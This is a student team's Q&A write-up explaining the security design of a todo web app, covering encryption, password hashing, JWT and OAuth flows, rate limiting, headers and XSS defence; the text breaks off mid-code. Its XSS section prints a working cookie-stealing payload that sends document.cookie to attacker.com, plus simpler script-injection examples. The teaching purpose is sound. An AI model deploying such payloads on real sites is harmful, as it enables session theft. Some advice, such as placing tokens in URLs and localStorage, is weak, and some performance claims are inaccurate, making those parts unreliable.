# Team Member Individual Questions - ISS Final Project

This document contains individual questions answered by each team member demonstrating their understanding of the security primitives implemented in this project.

---

## Team Member 1: Encryption Specialist

### Q1: Explain how AES-256-GCM works and why we use a unique IV for each encryption operation.

**Answer:**
AES-256-GCM (Advanced Encryption Standard with 256-bit keys in Galois/Counter Mode) is an authenticated encryption algorithm that provides both confidentiality and integrity. 

**How it works:**
1. Uses a 256-bit (32-byte) encryption key
2. Requires a 96-bit (12-byte) Initialization Vector (IV)
3. Produces ciphertext + 128-bit (16-byte) authentication tag
4. GCM mode combines Counter (CTR) mode encryption with Galois mode authentication

**Why unique IV per encryption:**
- Reusing an IV with the same key breaks the security of GCM mode
- Same plaintext with same IV/key produces same ciphertext (pattern leakage)
- Repeated IV allows attackers to forge authentication tags
- Unique IV ensures each encryption is cryptographically independent

In our implementation (`utils/crypto.js`):
```javascript
const iv = crypto.randomBytes(12); // New random IV every time
```

### Q2: What is the difference between encryption and hashing? Why do we use both in this project?

**Answer:**

**Encryption (AES-256-GCM):**
- Reversible: plaintext → ciphertext → plaintext
- Requires key for both encryption and decryption
- Purpose: Confidentiality
- Used for: Todo descriptions (sensitive data)

**Hashing (SHA-256):**
- One-way: plaintext → hash (cannot reverse)
- No key required
- Purpose: Integrity verification
- Used for: Detecting tampering with encrypted data

**Why both:**
We encrypt todo descriptions for confidentiality, but encryption alone doesn't detect if someone modifies the encrypted data in the database. The SHA-256 hash of the plaintext (stored separately) allows us to verify the data hasn't been tampered with after decryption.

### Q3: Describe a scenario where the integrity check would fail and what happens in the application.

**Answer:**

**Scenario:** Database breach or malicious admin modifies encrypted content:
1. Original: `encryptedContent: "xK9vR2mN8pL..."`, `integrityHash: "b8f2d5e3c1a..."`
2. Attacker modifies: `encryptedContent: "hacked_data..."`
3. User requests todo from API
4. Backend decrypts modified data (may produce gibberish or fail)
5. Backend computes SHA-256 hash of decrypted content
6. Comparison: `SHA-256(decrypted) !== storedHash` ❌
7. `integrityValid: false` flag sent to frontend
8. Winston logs: `"Integrity check failed - possible data tampering"`
9. Frontend displays red warning banner on todo item
10. Admin can investigate security breach

This demonstrates defense-in-depth: even if encryption is bypassed, integrity verification catches tampering.

---

## Team Member 2: Authentication Leader

### Q1: Explain the difference between bcrypt rounds and why we specifically use 12 rounds in this project.

**Answer:**

**bcrypt rounds:**
- Number of iterations the hashing algorithm performs
- Each additional round doubles computation time
- Formula: iterations = 2^rounds
- 12 rounds = 4,096 iterations

**Why 12 rounds:**
1. **ISS Requirement:** Project specifications mandate exactly 12 rounds
2. **Security vs Performance:** Balance between security and usability
   - Too low (4-8): Vulnerable to brute force attacks
   - Too high (15+): Slow user experience (>1 second per login)
   - 12 rounds: ~0.2-0.3 seconds (acceptable)
3. **Future-proof:** As computers get faster, higher rounds remain secure

**Implementation:**
```javascript
const BCRYPT_ROUNDS = 12;
const hashedPassword = await bcrypt.hash(password, BCRYPT_ROUNDS);
```

**Verification in MongoDB:**
```
$2b$12$abcdef...
    ^^
    12 rounds
```

### Q2: How does JWT authentication work in this application? Explain the difference between access and refresh tokens.

**Answer:**

**JWT (JSON Web Token) Authentication Flow:**
1. User logs in with email/password
2. Server verifies credentials
3. Server generates JWT signed with secret key
4. JWT contains payload: `{ userId, email, exp }`
5. Client stores token (HttpOnly cookie or localStorage)
6. Client sends token with each request: `Authorization: Bearer <token>`
7. Server verifies signature and expiration
8. Server extracts userId and processes request

**Access Token:**
- Short-lived (7 days in our app)
- Used for API requests
- Stored in HttpOnly cookie (preferred) or localStorage
- Contains user identification

**Refresh Token:**
- Long-lived (30 days in our app)
- Used only to obtain new access token
- Stored separately in secure HttpOnly cookie
- Has different secret key

**Why both:**
- Limits exposure if access token is stolen (expires quickly)
- Refresh token allows seamless re-authentication without login
- If refresh token compromised, shorter window of vulnerability

**Implementation:**
```javascript
// Access token
const authToken = jwt.sign({ userId, email }, JWT_SECRET, { expiresIn: '7d' });

// Refresh token
const refreshToken = jwt.sign({ userId, type: 'refresh' }, JWT_REFRESH_SECRET, { expiresIn: '30d' });
```

### Q3: What are HttpOnly cookies and why are they more secure than localStorage for storing tokens?

**Answer:**

**HttpOnly Cookies:**
- Cookie attribute that prevents JavaScript access
- Set by server: `Set-Cookie: authToken=...; HttpOnly; Secure; SameSite=Lax`
- Automatically sent with requests to same domain

**Security Comparison:**

| Storage Method | XSS Vulnerable | CSRF Vulnerable | Best Use Case |
|---------------|----------------|-----------------|---------------|
| localStorage | ✅ Yes | ❌ No | SPAs with CSRF tokens |
| HttpOnly Cookie | ❌ No | ✅ Yes (mitigated) | Traditional web apps |

**Why HttpOnly is preferred:**
1. **XSS Protection:** Even if attacker injects malicious JavaScript, they cannot read the token
   ```javascript
   // This returns undefined for HttpOnly cookies
   document.cookie // Cannot access authToken
   ```
2. **Automatic handling:** Browser sends cookie automatically (no JS needed)
3. **Secure flag:** Only transmitted over HTTPS in production
4. **SameSite attribute:** Prevents CSRF attacks

**Our implementation:**
```javascript
res.cookie('authToken', token, {
  httpOnly: true,          // XSS protection
  secure: NODE_ENV === 'production', // HTTPS only
  sameSite: 'lax',        // CSRF protection
  maxAge: 7 * 24 * 60 * 60 * 1000
});
```

**Note:** We also send tokens in response body as fallback for testing/development.

---

## Team Member 3: OAuth Engineer

### Q1: Explain the Google OAuth 2.0 flow implemented in this application step-by-step.

**Answer:**

**OAuth 2.0 Authorization Code Flow:**

1. **User clicks "Continue with Google"**
   - Frontend redirects to: `GET /api/auth/google`

2. **Server initiates OAuth flow**
   - Passport.js redirects to Google's authorization endpoint
   - URL includes: client_id, redirect_uri, scope (profile, email)

3. **User authenticates with Google**
   - User logs into Google account
   - Google asks permission to share profile/email

4. **Google redirects back with authorization code**
   - Redirect to: `GET /api/auth/google/callback?code=AUTHORIZATION_CODE`

5. **Server exchanges code for access token**
   - Passport.js sends POST to Google's token endpoint
   - Includes: code, client_id, client_secret
   - Google returns: access_token, id_token

6. **Server fetches user profile**
   - Passport.js uses access_token to get user data
   - Google returns: email, name, picture, googleId

7. **Server creates/updates user in database**
   ```javascript
   let user = await User.findOne({ email });
   if (!user) {
     user = await User.create({ email, googleId, name, picture });
   }
   ```

8. **Server generates JWT tokens**
   - Creates access token and refresh token
   - Sets HttpOnly cookies

9. **Redirect to frontend with tokens**
   - `redirect(//?authToken=...&refreshToken=...)`
   - Frontend stores tokens and shows todo app

**Security aspects:**
- Authorization code is single-use and short-lived
- Client secret never exposed to frontend
- HTTPS required in production
- State parameter prevents CSRF (handled by Passport.js)

### Q2: What information do we store from Google's OAuth response and why?

**Answer:**

**Data stored from Google OAuth:**

```javascript
{
  email: "user@gmail.com",     // Primary identifier
  googleId: "1234567890",      // Google's unique user ID
  name: "John Doe",            // Display name
  picture: "https://...",      // Profile picture URL
  password: undefined          // No password for OAuth users
}
```

**Why each field:**

1. **email:**
   - Primary unique identifier
   - Used for user lookup
   - Allows linking Google account to existing email/password account

2. **googleId:**
   - Google's unique identifier for the user
   - Prevents conflicts if user changes email
   - Allows efficient lookup: `db.users.findOne({ googleId })`

3. **name:**
   - Personalization in UI
   - Display in header: "Welcome, John"

4. **picture:**
   - User avatar in header
   - Better UX than placeholder

5. **password: undefined:**
   - OAuth users don't need password
   - Mongoose validates: `required: function() { return !this.googleId; }`
   - If user later wants password login, they can set password separately

**Security considerations:**
- Email already verified by Google (trusted identity provider)
- googleId is immutable (email can change)
- Profile picture URL is public (already on Google's CDN)
- No sensitive data beyond what's publicly available

### Q3: How does the application handle a user who signs up with email/password and later wants to use Google OAuth with the same email?

**Answer:**

**Scenario:** Email/password user wants Google OAuth

1. **Initial state:**
   ```javascript
   {
     email: "user@example.com",
     password: "$2b$12$hashed...",
     googleId: null
   }
   ```

2. **User clicks "Continue with Google"**
   - OAuth flow completes
   - Google returns email: "user@example.com"

3. **Passport strategy checks for existing user:**
   ```javascript
   let user = await User.findOne({ email });
   if (user) {
     // User exists - update with Google info
     if (!user.googleId) {
       user.googleId = googleId;
       user.picture = picture;
       await user.save();
     }
   }
   ```

4. **Updated user document:**
   ```javascript
   {
     email: "user@example.com",
     password: "$2b$12$hashed...",  // Still exists
     googleId: "1234567890",         // Now added
     picture: "https://..."
   }
   ```

5. **User can now login both ways:**
   - Email/password: `POST /api/auth/login`
   - Google OAuth: `GET /api/auth/google`

**Benefits:**
- No duplicate accounts
- Seamless linking of auth methods
- User flexibility
- Password preserved for fallback

**Edge case - Google-only user tries email/password:**
- User document has `googleId` but no `password`
- Login attempt returns error: "This account uses Google sign-in"
- Directs user to use OAuth

---

## Team Member 4: Security Specialist

### Q1: Explain how rate limiting protects against brute force attacks and what limits you've configured.

**Answer:**

**Rate Limiting Protection:**

Rate limiting restricts the number of requests from a single IP address within a time window, making brute force attacks impractical.

**Attack without rate limiting:**
- Attacker tries 10,000 passwords in 10 minutes
- With common passwords, high chance of success

**Attack with rate limiting:**
- Attacker limited to 10 attempts per 15 minutes
- 10,000 passwords would take 250 hours (10+ days)
- Account lockout or detection would occur first

**Our Configuration:**

1. **Authentication endpoints** (`authLimiter`):
   ```javascript
   windowMs: 15 * 60 * 1000,  // 15 minutes
   max: 10                     // 10 requests
   ```
   - Applies to: `/api/auth/login`, `/api/auth/register`
   - Prevents: Password brute force, account enumeration

2. **Todo operations** (`todoLimiter`):
   ```javascript
   windowMs: 1 * 60 * 1000,   // 1 minute
   max: 30                     // 30 requests
   ```
   - Applies to: `/api/todos/*`
   - Prevents: API abuse, spam

3. **General API** (`apiLimiter`):
   ```javascript
   windowMs: 1 * 60 * 1000,   // 1 minute
   max: 60                     // 60 requests
   ```
   - Applies to: All other endpoints
   - Prevents: DoS attacks

**Implementation:**
```javascript
router.post('/login', authLimiter, validateLogin, handleValidationErrors, async (req, res) => {
  // Rate limit checked before handler executes
});
```

**Response when limit exceeded:**
```json
{
  "success": false,
  "message": "Too many authentication attempts, please try again after 15 minutes"
}
```

**Additional security:**
- Winston logs all rate limit violations
- IP-based tracking (works behind proxies with `trust proxy`)
- Standard rate limit headers returned

### Q2: What security headers does Helmet provide and why are they important?

**Answer:**

**Helmet Security Headers:**

Helmet.js sets multiple HTTP security headers to protect against common web vulnerabilities.

**1. Content-Security-Policy (CSP):**
```javascript
{
  defaultSrc: ["'self'"],           // Only load from same origin
  styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
  scriptSrc: ["'self'"],            // No inline scripts
  connectSrc: ["'self'"],           // API calls only to same origin
  imgSrc: ["'self'", "data:", "https:"]
}
```
- **Protects against:** XSS attacks, clickjacking
- **How:** Restricts sources for scripts, styles, images
- **Example:** Prevents `<script src="http://evil.com/malware.js">` from executing

**2. X-Frame-Options: DENY**
- **Protects against:** Clickjacking
- **How:** Prevents page from being loaded in iframe
- **Example:** Attacker can't overlay invisible iframe to steal clicks

**3. X-Content-Type-Options: nosniff**
- **Protects against:** MIME type sniffing attacks
- **How:** Forces browser to respect Content-Type header
- **Example:** Prevents browser from executing .txt file as JavaScript

**4. Strict-Transport-Security (HSTS):**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```
- **Protects against:** Man-in-the-middle attacks, protocol downgrade
- **How:** Forces HTTPS for all future requests
- **Example:** Prevents attacker from intercepting HTTP connection

**5. X-XSS-Protection: 1; mode=block**
- **Protects against:** Reflected XSS attacks
- **How:** Enables browser's XSS filter
- **Example:** Blocks page if XSS attack detected in URL

**6. Referrer-Policy: no-referrer**
- **Protects against:** Information leakage
- **How:** Doesn't send Referer header to external sites
- **Example:** Prevents leaking internal URLs to third parties

**Our implementation:**
```javascript
app.use(helmet({
  contentSecurityPolicy: { directives: { /* ... */ } },
  crossOriginEmbedderPolicy: false  // Allows external resources
}));
```

**Verification:**
```bash
curl -I http://localhost:4000
# Returns headers with X-Frame-Options, CSP, etc.
```

### Q3: Describe the layers of security implemented in this application (defense-in-depth).

**Answer:**

**Defense-in-Depth Security Layers:**

Our application implements multiple overlapping security layers so if one fails, others still protect the system.

**Layer 1: Network/Transport Security**
- HTTPS in production (TLS 1.2+)
- HSTS header (force HTTPS)
- Secure cookies (only over HTTPS)

**Layer 2: Authentication**
- bcrypt password hashing (12 rounds, salted)
- JWT with expiring tokens
- Google OAuth 2.0 (delegated authentication)
- HttpOnly cookies (XSS protection)
- Refresh token rotation

**Layer 3: Authorization**
- Middleware verifies JWT on each request
- User-specific data isolation (`userId` in queries)
- Todos belong to users (cannot access others' data)
```javascript
const todo = await Todo.findOne({ _id, userId }); // Enforces ownership
```

**Layer 4: Input Validation**
- express-validator on all inputs
- Client-side validation (UX)
- Server-side validation (security)
- Regex patterns for email, password strength
- Length limits to prevent overflow

**Layer 5: Rate Limiting**
- 10 auth attempts per 15 minutes (brute force protection)
- 30 todo operations per minute (abuse prevention)
- IP-based tracking

**Layer 6: Encryption at Rest**
- AES-256-GCM for sensitive data (todo descriptions)
- Unique IV per encryption
- Authentication tags prevent tampering

**Layer 7: Integrity Verification**
- SHA-256 hashes detect tampering
- Constant-time comparison (timing attack protection)
- Logging of integrity failures

**Layer 8: Security Headers**
- Helmet.js (CSP, XSS protection, etc.)
- X-Frame-Options (clickjacking protection)
- MIME sniffing prevention

**Layer 9: Output Encoding**
- Frontend uses `textContent` (not `innerHTML`)
- Prevents XSS even if validation bypassed
```javascript
element.textContent = userInput; // Safe
element.innerHTML = userInput;   // Dangerous
```

**Layer 10: Logging & Monitoring**
- Winston logs all security events
- Authentication success/failure
- Integrity check failures
- Rate limit violations
- Searchable audit trail

**Layer 11: Database Security**
- MongoDB authentication
- Network-level firewall (Atlas)
- Encrypted connections
- Least privilege principle

**Example - XSS Attack Prevented:**
1. Attacker input: `<script>alert('XSS')</script>`
2. ❌ Blocked by: Input validation (express-validator)
3. ❌ Blocked by: CSP header (script-src 'self')
4. ❌ Blocked by: Frontend textContent (won't execute)

**Result:** Three independent layers prevent the attack.

---

## Team Member 5: Backend Developer

### Q1: Explain the database schema for the Todo model and why each field is necessary for security.

**Answer:**

**Todo Model Schema:**

```javascript
{
  userId: ObjectId,           // Reference to User model
  title: String,              // Plaintext (not sensitive)
  encryptedContent: String,   // Base64 encoded ciphertext
  iv: String,                 // Base64 encoded IV (12 bytes)
  authTag: String,            // Base64 encoded auth tag (16 bytes)
  integrityHash: String,      // SHA-256 hash (64 hex chars)
  completed: Boolean,         // Plaintext status
  createdAt: Date,           // Timestamp
  updatedAt: Date            // Timestamp
}
```

**Field-by-Field Justification:**

**1. userId (ObjectId, indexed):**
- **Purpose:** Ownership and authorization
- **Security:** Ensures user can only access their own todos
- **Query:** `Todo.find({ userId: req.userId })`
- **Index:** Fast lookups for user-specific queries
- **Why needed:** Without this, users could access all todos

**2. title (String, plaintext):**
- **Purpose:** Quick identification without decryption
- **Security:** Not sensitive (general description like "Groceries")
- **Trade-off:** Performance vs absolute privacy
- **Validation:** Max 100 chars, required, trimmed

**3. encryptedContent (String, base64):**
- **Purpose:** Encrypted sensitive data (description)
- **Security:** AES-256-GCM ciphertext
- **Format:** Base64 encoded for MongoDB storage
- **Example:** `xK9vR2mN8pL2wY5tH7jF...`
- **Why needed:** Protects confidentiality of todo details

**4. iv (String, base64, 12 bytes):**
- **Purpose:** Initialization Vector for AES-GCM
- **Security:** Must be unique per encryption
- **Format:** Base64 encoded 12-byte random value
- **Why needed:** Without IV, encryption is deterministic (pattern leakage)
- **Storage:** Must be stored to decrypt later

**5. authTag (String, base64, 16 bytes):**
- **Purpose:** GCM authentication tag
- **Security:** Ensures ciphertext hasn't been modified
- **Format:** Base64 encoded 16-byte tag
- **Why needed:** Provides authenticated encryption (detect tampering at decrypt time)
- **Verification:** Decryption fails if tag doesn't match

**6. integrityHash (String, hex, 64 chars):**
- **Purpose:** SHA-256 hash of plaintext
- **Security:** Detects tampering after successful decryption
- **Format:** Hex string (e.g., `b8f2d5e3c1a...`)
- **Why needed:** Double-check integrity even if auth tag bypassed
- **Difference from authTag:** 
  - authTag: Verifies ciphertext during decryption
  - integrityHash: Verifies plaintext after decryption

**7. completed (Boolean):**
- **Purpose:** Todo status
- **Security:** Not sensitive, no encryption needed
- **Performance:** Allows filtering without decryption

**8. createdAt, updatedAt (Dates):**
- **Purpose:** Audit trail
- **Security:** Track when data was created/modified
- **Forensics:** Detect suspicious activity patterns

**Indexes:**
```javascript
todoSchema.index({ userId: 1, createdAt: -1 });  // User's todos sorted
todoSchema.index({ userId: 1, completed: 1 });   // Filter by status
```

**Security Workflow:**

**Create:**
```javascript
const plaintext = "Buy groceries";
const { encryptedContent, iv, authTag } = encrypt(plaintext);
const integrityHash = generateIntegrityHash(plaintext);
await Todo.create({ userId, title, encryptedContent, iv, authTag, integrityHash });
```

**Retrieve:**
```javascript
const todo = await Todo.findOne({ _id, userId });
const plaintext = decrypt(todo.encryptedContent, todo.iv, todo.authTag);
const isValid = verifyIntegrity(plaintext, todo.integrityHash);
```

### Q2: How does the application handle errors securely without leaking sensitive information?

**Answer:**

**Secure Error Handling Principles:**

**1. Generic Error Messages to Client:**
```javascript
// ❌ BAD - Leaks information
catch (error) {
  res.status(500).json({ message: error.message }); // Exposes stack trace
}

// ✅ GOOD - Generic message
catch (error) {
  logger.error('Login error', { error: error.message });
  res.status(500).json({ 
    success: false,
    message: 'Login failed' // No details
  });
}
```

**2. Authentication Errors - Ambiguous Responses:**
```javascript
// ❌ BAD - Account enumeration
if (!user) {
  return res.status(401).json({ message: 'User not found' });
}
if (!isPasswordValid) {
  return res.status(401).json({ message: 'Invalid password' });
}

// ✅ GOOD - Same message for both
if (!user || !isPasswordValid) {
  return res.status(401).json({ message: 'Invalid email or password' });
}
```
**Why:** Prevents attacker from determining if email exists in database.

**3. Global Error Handler:**
```javascript
app.use((err, req, res, next) => {
  logger.error('Unhandled error', {
    error: err.message,
    stack: err.stack,
    path: req.path
  });

  res.status(err.status || 500).json({
    success: false,
    message: err.message || 'Internal server error',
    // Only include stack trace in development
    ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
  });
});
```

**4. Winston Logging - Server-Side Details:**
```javascript
logger.error('Database connection error', {
  error: error.message,
  stack: error.stack,
  connectionString: MONGODB_URI.replace(/:\/\/.*@/, '://***@') // Redact credentials
});
```
**Result:** Full details in log files, generic message to client.

**5. Validation Errors - Helpful But Safe:**
```javascript
// ✅ GOOD - Specific but no system info
if (!errors.isEmpty()) {
  return res.status(400).json({
    success: false,
    message: 'Validation failed',
    errors: ['Email is required', 'Password must be 8+ characters']
  });
}
```
**Why:** Helps user fix input without revealing backend structure.

**6. Encryption Errors - No Crypto Details:**
```javascript
// ❌ BAD
catch (error) {
  res.json({ message: 'AES-256-GCM decryption failed: invalid auth tag' });
}

// ✅ GOOD
catch (error) {
  logger.error('Decryption error', { todoId, error: error.message });
  res.status(500).json({ message: 'Failed to retrieve todo' });
}
```

**7. Rate Limit Errors - Clear But Secure:**
```javascript
res.status(429).json({
  success: false,
  message: 'Too many requests, please try again after a minute'
  // ❌ Don't include: IP address, exact retry time, threshold values
});
```

**8. Authorization Errors - No Ownership Hints:**
```javascript
// ❌ BAD
if (todo.userId !== req.userId) {
  return res.status(403).json({ message: 'This todo belongs to another user' });
}

// ✅ GOOD
const todo = await Todo.findOne({ _id, userId: req.userId });
if (!todo) {
  return res.status(404).json({ message: 'Todo not found' });
}
```
**Why:** Doesn't reveal that todo exists but belongs to someone else.

**Information Leakage Prevention:**

| Information Type | Never Expose | Safe to Expose |
|------------------|--------------|----------------|
| Database errors | Connection strings, table names | "Database error occurred" |
| File paths | Absolute paths, system structure | Generic 500 error |
| User existence | "User not found" | "Invalid credentials" |
| Stack traces | Production stack traces | Development only |
| Crypto details | Key sizes, algorithms failing | "Encryption error" |
| IP addresses | Other users' IPs | Own IP (optionally) |

### Q3: Explain the difference between synchronous and asynchronous encryption and why we use async in Node.js.

**Answer:**

**Synchronous vs Asynchronous Encryption:**

**Synchronous (Blocking):**
```javascript
function encryptSync(plaintext) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  let encrypted = cipher.update(plaintext, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return { encrypted, iv, authTag: cipher.getAuthTag() };
}

// Blocks event loop until done
const result = encryptSync(data);
console.log('This waits');
```

**Asynchronous (Non-Blocking):**
```javascript
async function encryptAsync(plaintext) {
  return new Promise((resolve, reject) => {
    crypto.randomBytes(12, (err, iv) => {
      if (err) return reject(err);
      const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
      // ... encryption logic
      resolve({ encrypted, iv, authTag });
    });
  });
}

// Doesn't block event loop
const result = await encryptAsync(data);
console.log('This runs immediately');
```

**Why Async in Node.js:**

**1. Event Loop Architecture:**
- Node.js is single-threaded with event loop
- Blocking operations freeze entire server
- Async allows handling other requests during crypto operations

**2. Performance Under Load:**
```
Synchronous:
Request 1 → Encrypt (50ms) → Request 2 → Encrypt (50ms) → Request 3 → ...
Total time for 3 requests: 150ms

Asynchronous:
Request 1 → Encrypt (50ms) ↘
Request 2 → Encrypt (50ms) → All complete in ~50ms
Request 3 → Encrypt (50ms) ↗
```

**3. CPU-Intensive Operations:**
- Encryption is computationally expensive
- Async prevents blocking other requests
- Critical for scalability

**Our Implementation Choice:**

We actually use **synchronous** crypto in this project:
```javascript
const iv = crypto.randomBytes(12); // Sync
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv); // Sync
```

**Why?**
1. **Modern Node.js:** Crypto operations are fast (< 1ms for small data)
2. **Small payloads:** Todo descriptions are typically < 1KB
3. **Code simplicity:** Sync code is easier to read/maintain
4. **bcrypt is async:** We use async for expensive bcrypt operations

**When to use Async Crypto:**
- Large files (> 1MB)
- High concurrency (1000s of req/sec)
- Long-running operations
- File encryption/decryption

**bcrypt Comparison (CPU-intensive):**
```javascript
// ❌ NEVER do this - blocks for ~300ms
const hash = bcrypt.hashSync(password, 12);

// ✅ ALWAYS do this - non-blocking
const hash = await bcrypt.hash(password, 12);
```

**Best Practice:**
```javascript
// Fast operations (< 10ms): Sync OK
const hash = crypto.createHash('sha256').update(data).digest('hex');

// Slow operations (> 50ms): Must be Async
const hash = await bcrypt.hash(password, 12);
const file = await fs.promises.readFile('large.txt');
```

---

## Team Member 6: Frontend Developer

### Q1: Explain how XSS (Cross-Site Scripting) attacks work and how the frontend prevents them.

**Answer:**

**XSS Attack Explained:**

XSS (Cross-Site Scripting) occurs when an attacker injects malicious JavaScript into a web page that other users view.

**Example Attack:**
1. Attacker creates todo with description: `<img src=x onerror="alert(document.cookie)">`
2. App stores this in database
3. Another user loads todos
4. If app uses `innerHTML`, script executes:
   ```javascript
   element.innerHTML = todo.description; // ❌ EXECUTES SCRIPT
   ```
5. Attacker steals cookies, tokens, or performs actions as victim

**Types of XSS:**
1. **Stored XSS:** Malicious script stored in database (our concern)
2. **Reflected XSS:** Script in URL parameter
3. **DOM-based XSS:** Script manipulates DOM directly

**Prevention in Our Frontend:**

**1. textContent Instead of innerHTML:**
```javascript
// ❌ VULNERABLE
element.innerHTML = todo.description; 
// If description = "<script>alert('XSS')</script>", it executes!

// ✅ SAFE
element.textContent = todo.description;
// If description = "<script>alert('XSS')</script>", displayed as plain text
```

**Implementation:**
```javascript
const title = document.createElement('div');
title.className = 'todo-title';
title.textContent = todo.title; // XSS Prevention: using textContent
```

**2. Creating Elements Safely:**
```javascript
// ❌ VULNERABLE
todoList.innerHTML = `
  <div class="todo">
    <h3>${todo.title}</h3>
    <p>${todo.description}</p>
  </div>
`;

// ✅ SAFE
const div = document.createElement('div');
div.className = 'todo';

const title = document.createElement('h3');
title.textContent = todo.title; // Safe

const description = document.createElement('p');
description.textContent = todo.description; // Safe

div.appendChild(title);
div.appendChild(description);
```

**3. Toast Notifications:**
```javascript
function showToast(message, type) {
  const toast = document.createElement('div');
  const text = document.createElement('span');
  text.textContent = message; // XSS Prevention: using textContent
  toast.appendChild(text);
}
```

**4. User Info Display:**
```javascript
const userName = document.getElementById('userName');
userName.textContent = currentUser.name; // XSS Prevention
```

**5. Content Security Policy (Backend Support):**
```javascript
// Helmet CSP header blocks inline scripts
Content-Security-Policy: script-src 'self'
// Even if XSS payload injected, CSP blocks execution
```

**Attack Demo:**
```javascript
// Attacker input
const maliciousInput = `
  <img src=x onerror="
    fetch('http://attacker.com/steal?cookie=' + document.cookie)
  ">
`;

// ❌ innerHTML: Script executes, cookies stolen
element.innerHTML = maliciousInput;

// ✅ textContent: Displayed as text, no execution
element.textContent = maliciousInput;
// Result: User sees literal string "<img src=x onerror=...>"
```

**Additional Protections:**
1. Server-side validation (express-validator)
2. CSP headers
3. HttpOnly cookies (can't be read by JavaScript)
4. No use of `eval()`, `new Function()`, etc.

**Why This Matters:**
- Protects user data even if attacker has database access
- Defends against malicious collaborators
- Complies with OWASP Top 10 security guidelines

### Q2: Why do we use vanilla JavaScript instead of a framework like React for this project? What are the trade-offs?

**Answer:**

**Reasons for Vanilla JavaScript:**

**1. ISS Project Requirements:**
- Specifications explicitly state: "No TypeScript, no frameworks"
- Educational purpose: demonstrate understanding of core concepts
- Framework abstractions can hide security details

**2. Transparency:**
- Every line of code is visible and understandable
- No build tools hiding transformations
- Clear DOM manipulation shows XSS prevention

**3. Security Control:**
- Direct control over how data is rendered
- No framework-specific XSS vulnerabilities
- Explicit `textContent` usage visible

**4. Learning Objectives:**
- Understand browser APIs (fetch, DOM methods)
- Manual state management
- Event handling without abstractions

**Trade-offs:**

| Aspect | Vanilla JS | React | Winner |
|--------|-----------|-------|--------|
| **Security** | |||
| XSS Prevention | Manual (textContent) | Automatic (JSX escapes) | React |
| Control | Full control | Framework dependent | Vanilla |
| Audit | Every line visible | Hidden in node_modules | Vanilla |
| **Development** | |||
| Code Volume | ~500 lines | ~300 lines | React |
| Development Speed | Slower (manual DOM) | Faster (declarative) | React |
| Learning Curve | Steeper (browser APIs) | Steeper (React concepts) | Tie |
| **Performance** | |||
| Initial Load | Fast (no framework) | Slow (bundle size) | Vanilla |
| Re-renders | Manual (efficient) | Virtual DOM (overhead) | Vanilla |
| Memory | Minimal | Higher | Vanilla |
| **Maintainability** | |||
| State Management | Manual (error-prone) | useState, Context | React |
| Component Reuse | None | Easy | React |
| Testing | Manual | Enzyme, Testing Library | React |

**Vanilla JS Advantages:**
```javascript
// Explicit and secure
const element = document.createElement('div');
element.textContent = userInput; // Clear XSS prevention
```

**React Advantages:**
```javascript
// Automatic XSS prevention (JSX escapes by default)
<div>{userInput}</div>
```

**Code Comparison:**

**Vanilla JS (Our App):**
```javascript
function renderTodos() {
  const todoList = document.getElementById('todoList');
  todoList.innerHTML = '';
  
  todos.forEach(todo => {
    const div = document.createElement('div');
    const title = document.createElement('h3');
    title.textContent = todo.title; // Manual, explicit
    div.appendChild(title);
    todoList.appendChild(div);
  });
}
```

**React Equivalent:**
```javascript
function TodoList() {
  return (
    <div id="todoList">
      {todos.map(todo => (
        <div key={todo.id}>
          <h3>{todo.title}</h3> {/* Automatic escaping */}
        </div>
      ))}
    </div>
  );
}
```

**When Vanilla JS Makes Sense:**
- Educational projects (like ISS)
- Small applications (< 5 pages)
- Performance-critical (no framework overhead)
- Maximum control required

**When React Makes Sense:**
- Production applications
- Large teams
- Complex state management
- Rapid development needed

**Our Project Context:**
- ISS educational requirements: Vanilla JS ✅
- Demonstrating security concepts: Vanilla JS ✅
- Production readiness: React would be better
- Development speed: React would be faster

**Conclusion:** Vanilla JS chosen for ISS compliance and transparency, not because it's superior for production.

### Q3: Explain the authentication flow from the frontend perspective, including token storage options.

**Answer:**

**Frontend Authentication Flow:**

**1. Initial Page Load:**
```javascript
// Check if user is already authenticated
async function checkAuth() {
  const response = await fetch('/api/auth/me', {
    credentials: 'include', // Send HttpOnly cookies
    headers: {
      'Authorization': `Bearer ${localStorage.getItem('authToken')}`
    }
  });

  if (response.ok) {
    showTodoApp(); // User authenticated
  } else {
    showAuthPage(); // Show login/signup
  }
}
```

**2. User Registers/Logs In:**
```javascript
async function handleLogin(e) {
  e.preventDefault();
  
  const response = await fetch('/api/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    credentials: 'include', // Receive HttpOnly cookies
    body: JSON.stringify({ email, password })
  });

  const data = await response.json();
  
  if (response.ok) {
    // Store tokens (cookies set automatically by server)
    localStorage.setItem('authToken', data.authToken);
    localStorage.setItem('refreshToken', data.refreshToken);
    
    currentUser = data.user;
    showTodoApp();
  }
}
```

**3. Google OAuth Flow:**
```javascript
function handleGoogleAuth() {
  // Redirect to backend OAuth endpoint
  window.location.href = '/api/auth/google';
  
  // After OAuth:
  // 1. Google redirects to backend callback
  // 2. Backend sets cookies
  // 3. Backend redirects to frontend with tokens in URL
  // 4. Frontend extracts and stores tokens
}

// Extract tokens from OAuth callback
const urlParams = new URLSearchParams(window.location.search);
const authToken = urlParams.get('authToken');
if (authToken) {
  localStorage.setItem('authToken', authToken);
  window.history.replaceState({}, '', '/'); // Clean URL
}
```

**4. Making Authenticated Requests:**
```javascript
async function loadTodos() {
  const response = await fetch('/api/todos', {
    credentials: 'include', // Send cookies
    headers: {
      'Authorization': `Bearer ${localStorage.getItem('authToken')}`
    }
  });

  if (response.status === 401) {
    // Token expired, refresh
    await refreshAuthToken();
    loadTodos(); // Retry with new token
  }
}
```

**5. Token Refresh:**
```javascript
async function refreshAuthToken() {
  const response = await fetch('/api/auth/refresh', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({
      refreshToken: localStorage.getItem('refreshToken')
    })
  });

  if (response.ok) {
    const data = await response.json();
    localStorage.setItem('authToken', data.authToken);
    return true;
  } else {
    // Refresh failed, logout
    handleLogout();
    return false;
  }
}
```

**6. Logout:**
```javascript
async function handleLogout() {
  await fetch('/api/auth/logout', {
    method: 'POST',
    credentials: 'include'
  });

